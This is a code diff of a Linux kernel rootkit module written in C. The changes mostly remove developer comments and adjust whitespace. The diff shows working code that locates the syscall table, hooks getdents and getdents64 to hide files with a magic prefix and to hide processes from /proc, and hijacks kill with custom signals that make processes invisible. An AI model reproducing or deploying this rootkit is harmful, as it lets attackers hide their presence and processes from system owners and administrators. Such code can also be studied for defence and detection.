@@ -42,7 +42,6 @@ unsigned long init_begin;
 #endif
 static unsigned long *__sys_call_table;
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-	// TODO: no idea what this means
 	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
 	static t_syscall orig_getdents;
 	static t_syscall orig_getdents64;
@@ -62,9 +61,8 @@ unsigned long *
 get_syscall_table_bf(void)
 {
 	unsigned long *syscall_table;
-
+ 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
-   // TODO: gets system call table, how?
 	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
 	return syscall_table;
 #else
@@ -84,7 +82,6 @@ get_syscall_table_bf(void)
 struct task_struct *
 find_task(pid_t pid)
 {
-	// TODO: May be passing the current is useless here
 	struct task_struct *p = current;
 	for_each_process(p) {
 		if (p->pid == pid)
@@ -140,7 +137,6 @@ changeInvisibleThreads(pid_t pid)
 int
 is_invisible(pid_t pid)
 {
-	// https://github.com/torvalds/linux/blob/master/include/linux/sched.h
 	struct task_struct *task;
 	if (!pid)
 		return 0;
@@ -161,8 +157,6 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
 	int fd = (int) pt_regs->regs[0];
 	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
 #endif
-   // err is assigned here, where err comes from is to be determined
-	// returns bytes reader
 	int ret = orig_getdents64(pt_regs), err;
 #else
 asmlinkage int
@@ -178,7 +172,7 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 
 	if (ret <= 0)
 		return ret;
-	// allocate memory
+
 	kdirent = kzalloc(ret, GFP_KERNEL);
 	if (kdirent == NULL)
 		return ret;
@@ -190,22 +184,17 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
 #else
-	// TODO: head hurts here !!
-	// current tasks -> All open files -> file desc table ->  ?? -> path.directory_entry -> iNode
 	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 #endif
-	//comparing index number with that of /proc and  making sure its not device ??
 	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
 		proc = 1;
 
 	while (off < ret) {
 		dir = (void *)kdirent + off;
-
-		//
-		if ((!proc && (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
-		// if proc directory and the task is invisible
-		|| (proc &&	is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			// if ...
+		if ((!proc &&
+		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
+		|| (proc &&
+		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
 				memmove(dir, (void *)dir + dir->d_reclen, ret);
@@ -247,7 +236,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	struct inode *d_inode;
 
 	if (ret <= 0)
-		return ret;
+		return ret; 
 
 	kdirent = kzalloc(ret, GFP_KERNEL);
 	if (kdirent == NULL)
@@ -269,7 +258,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 
 	while (off < ret) {
 		dir = (void *)kdirent + off;
-		if ((!proc &&
+		if ((!proc && 
 		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
 		|| (proc &&
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
@@ -310,19 +299,19 @@ hacked_kill(pid_t pid, int sig)
 	struct task_struct *task;
 	switch (sig) {
 		case SIGINVIS:
-			// if task not found or is already invisible
 			if ((task = find_task(pid)) == NULL || is_invisible(pid) == true)
 				return -ESRCH;
 			task->flags ^= PF_INVISIBLE;
+			// uncomment for process that creates child processes
 			//changeInvisibleChildren(task->pid);
 			changeInvisibleThreads(task->pid);
 			printk(KERN_INFO "rootkit: process invisible >:-)\n");
 			break;
 		case SIGVIS:
-			// if task not found or is already visible
 			if ((task = find_task(pid)) == NULL || is_invisible(pid) == false)
 				return -ESRCH;
 			task->flags ^= PF_INVISIBLE;
+			// uncomment for process that creates child processes
 			//changeInvisibleChildren(task->pid);
 			changeInvisibleThreads(task->pid);
 			printk(KERN_INFO "rootkit: process visible :-(\n");
